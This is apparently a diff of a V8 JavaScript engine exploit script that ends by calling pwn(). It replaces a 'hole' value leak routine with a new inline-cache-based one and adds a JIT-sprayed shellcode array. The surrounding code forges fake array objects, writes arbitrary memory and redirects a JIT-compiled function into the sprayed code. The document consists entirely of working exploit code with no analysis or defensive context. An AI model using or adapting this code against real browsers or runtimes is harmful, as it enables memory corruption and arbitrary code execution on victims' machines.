@@ -174,34 +174,23 @@
   function set_keyed_prop(arr, key, val) {
       arr[key] = val;
   }
-  var h0le = [0];
-function leak_hole() {
-    function rGlobal() {
-        h0le[0] = stack;
-    }
-    Error.captureStackTrace(globalThis);
-    Error.prepareStackTrace = function() {
-        Reflect.deleteProperty(Error, 'prepareStackTrace');
-        Reflect.deleteProperty(globalThis, 'stack');
-        Reflect.defineProperty(
-            globalThis, 'stack',
-            {configurable: false, writable: true, enumerable: true, value: 1});
-        stack = undefined;
-        for (let i = 0; i < 100000; i++) {
-            rGlobal();
-        }
-        
-        return undefined;
-    };
-    Reflect.defineProperty(
-        globalThis, 'stack',
-        {configurable: true, writable: true, enumerable: true, value: undefined});
-    //%DebugPrint(Reflect.getOwnPropertyDescriptor(globalThis, "stack"));
-    delete globalThis.stack;
+  
+  function leak_hole() {
+      let store_mode = []; //STORE_AND_GROW_HANDLE_COW
+  
+      const IC_WARMUP_COUNT = 10;
+      for(let i = 0; i < IC_WARMUP_COUNT; i++) {
+          set_keyed_prop(arguments, "foo", 1);
+      }
     
-    rGlobal();
-    return h0le[0];
-}
+      set_keyed_prop(store_mode, 0, 1);
+  
+      set_keyed_prop(arguments, arguments.length, 1);
+  
+      let hole = arguments[arguments.length+1];
+  
+      return hole;
+  }
   const the = {};
   var large_arr = new Array(0x10000);
   large_arr.fill(itof(0xDEADBEE0n)); //change array type to HOLEY_DOUBLE_ELEMENTS_MAP
@@ -356,6 +345,26 @@ function leak_hole() {
       
       let temp_fake_arr_addr = (packed_dbl_elements + FIXED_ARRAY_HEADER_SIZE)|1n;
       
+      // print("packed_dbl_map = " + packed_dbl_map.toString(16));
+      // print("packed_dbl_props = " + packed_dbl_props.toString(16));
+      // print("packed_dbl_elements = " + packed_dbl_elements.toString(16));
+      // print("packed_map = " + packed_map.toString(16));
+      // print("packed_props = " + packed_props.toString(16));
+      // print("packed_elements = " + packed_elements.toString(16));
+      // print("fixed_arr_map = " + fixed_arr_map.toString(16));
+      // print("large_arr = " + large_arr_addr.toString(16));
+      // print("[+] packed_map_and_props : 0x" + packed_map_and_props.toString());
+      // print("[+] packed_elements_and_len : 0x" + packed_elements_and_len.toString());
+      // %DebugPrint(leaks[7]);
+      // %SystemBreak();
+      //print("addr = " + ftoi(leaks[0]).toString(16));
+      //print("addr = " + ftoi(leaks[1]).toString(16));
+      //
+      //print("addr = " + ftoi(leaks[2]).toString(16));
+      //print("addr = " + ftoi(leaks[3]).toString(16));
+      //
+      //print("addr = " + ftoi(leaks[4]).toString(16));
+      //print("addr = " + ftoi(leaks[5]).toString(16));
   
       let temp_fake_arr = weak_fake_obj(true, itof(temp_fake_arr_addr));
       let large_arr_elements_addr = ftoi(temp_fake_arr[0]) & 0xFFFFFFFFn;
@@ -409,7 +418,8 @@ function leak_hole() {
   
       v8_write64(f_x_code_addr+0x7n+0x8n,jit_addr+0xb3n+0x6n);
       // %DebugPrint(f_x);
-    //   alert("target : " + hex(jit_addr+0xb3n+0x6n));
+      var test_sc = [0xceb90f0e48348fc,0xceb909090909090,0xceb515250415141,0xceb9090d2314856,0xceb9090d2314856,0xceb9060528b4865,0xceb909020528b48,0xceb909050728b48,0xceb904a4ab70f48,0xcebc03148c9314d,0xceb909090613cac,0xceb0dc9c141202c,0xceb52ebe2c10141,0xceb20528b485141,0xcebd001483c428b,0xceb00000088808b,0xceb906274c08548,0xceb909050d00148,0xceb90909018488b,0xceb909020408b44,0xceb9051e3d00149,0xceb909090c9ff48,0xceb909088348b41,0xcebc9314dd60148,0xceb9090acc03148,0xceb90900dc9c141,0xceb909090c10141,0xceb9090ee75e038,0xceb9008244c034c,0xceb58d375d13945,0xceb909024408b44,0xceb909090d00149,0xceb90480c8b4166,0xceb90901c408b44,0xceb909090d00149,0xceb909088048b41,0xceb905841d00148,0xceb905a595e5841,0xceb5a4159415841,0xceb524120ec8348,0xceb5a594158e0ff,0xceb909090128b48,0xceb90ffffff67e9,0xceb9090d231485d,0xceb909090c2ff48,0xceb9090714d8d48,0xceb909070c18348,0xceb909020c18348,0xceb876f8b31ba41,0xceb90909090d5ff,0xceb9056a2b5f0bb,0xceb9dbd95a6ba41,0xceb28c48348d5ff,0xceb9090047c063c,0xceb900275e0fb80,0xceb906f721347bb,0xcebda894159006a,0xceb906c618bd5ff,0xceb909090902e8b,0xceb909090906678];
+      //alert("target : " + hex(jit_addr+0xb3n+0x6n));
       f_x();
   }
   pwn();
